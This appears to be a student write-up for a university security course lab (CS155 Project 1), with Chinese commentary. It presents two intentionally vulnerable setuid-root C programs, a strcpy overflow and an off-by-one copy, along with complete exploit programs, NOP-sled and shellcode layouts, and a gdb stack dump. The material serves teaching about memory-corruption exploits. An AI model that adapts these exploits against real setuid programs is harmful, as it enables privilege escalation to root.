# cs155

- [Proj1](#proj1)
    + [Target1 Buffer overflow](#target1-buffer-overflow)
    + [Target2 Off-by-one](#target2-off-by-one)

# Proj1
## Target1 Buffer overflow
```c
int bar(char *arg, char *out)
{
  strcpy(out, arg);
  return 0;
}

void foo(char *argv[])
{
  char buf[256];
  bar(argv[1], buf);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target1: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
最基本的buffer overflow，直接更改return的地址，指向buf前面的NOP，然后进入执行shellcode
```c
int main(void)
{
  // put '\0' at the end
  char sploitstring[256 + 2 * sizeof(int) + 1];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[sizeof(sploitstring) - 1] = 0;

  // shellcode is a string which ends with '\0'
  // should not copy '\0' to buffer otherwise
  // there wont be a buffer overflow
  memcpy(sploitstring + 100, shellcode, sizeof(shellcode) - 1);

  // address of eip
  int *ret = (int *) (sploitstring + 256 + sizeof(int));
  *ret = 0xbffffc5c;


  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```
## Target2 Off by one
虽然nstrcpy做了范围check，但是多复制了一个byte，因此可以overflow `%ebp`
```c
void nstrcpy(char *out, int outl, char *in)
{
  int i, len;

  len = strlen(in);
  if (len > outl)
    len = outl;

  for (i = 0; i <= len; i++)
    out[i] = in[i];
}

void bar(char *arg)
{
  char buf[200];

  nstrcpy(buf, sizeof buf, arg);
}

void foo(char *argv[])
{
  bar(argv[1]);
}

int main(int argc, char *argv[])
{
  if (argc != 2)
    {
      fprintf(stderr, "target2: argc != 2\n");
      exit(EXIT_FAILURE);
    }
  setuid(0);
  foo(argv);
  return 0;
}
```
因为x86用的是little endian，所以溢出的两个byte就是`%ebp`的最后的两个byte，比如原来系统中`%ebp`为`0xbffffd90`，因为`sploitstring[200]=0`，所以`%ebp`就变为`0xbffffd00`，因为buf里面有201个byte，但是32位机器要连续两个word，所以溢出了两个byte

buf从`0xbffffcc8`开始，`%ebp=0xbffffd90`，buf溢出后修改`%ebp`的最后两个byte使得`%ebp`变成`%ebp=0xbffffd00`也就是在buf中间的`new_ebp`，当函数返回时，`%esp`会从`new_ebp`中load，为了方便显示，`0xbffffd00`中存了`0xffffffff`，然后`%esp`拿栈顶来load给`%eip`也就数`new_ebp`后面的`new_eip`，这也是shellcode的起始地址

```
                                  ^------------|
                                  |            v
addr: 0xbffffcc8  0xbffffd00 0xbffffd04                          
       [buffer  ...  new_ebp   new_eip ... shellcode]|[ebp]|[return]
val:              0xffffffff 0xbffffd08            0xbffffd00
                        ^                               |
                        |-------------------------------v
```


```bash
$ (gdb) x/100x buf
0xbffffcc8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffcd8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffce8: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffcf8: 0x90909090  0x90909090  0xffffffff  0xbffffd08
0xbffffd08: 0x895e1feb  0xc0310876  0x89074688  0x0bb00c46
0xbffffd18: 0x4e8df389  0x0c568d08  0xdb3180cd  0xcd40d889
0xbffffd28: 0xffdce880  0x622fffff  0x732f6e69  0x90909068
0xbffffd38: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd48: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd58: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd68: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd78: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffffd88: 0x90909090  0x90909090  0xbffffd00  0x0804854e
                                         ^
                                        %ebp
```
```c
int main(void)
{
  char sploitstring[201];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  sploitstring[200] = 0;
  
  int offset = 0xbffffd00 - 0xbffffcc8;
  *(int *) (sploitstring + offset) = 0xffffffff;
  *(int *) (sploitstring + offset + 4) = 0xbffffd00 + 4 + 4;
  memcpy(sploitstring + offset + 4 + 4, shellcode, strlen(shellcode)); 

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
```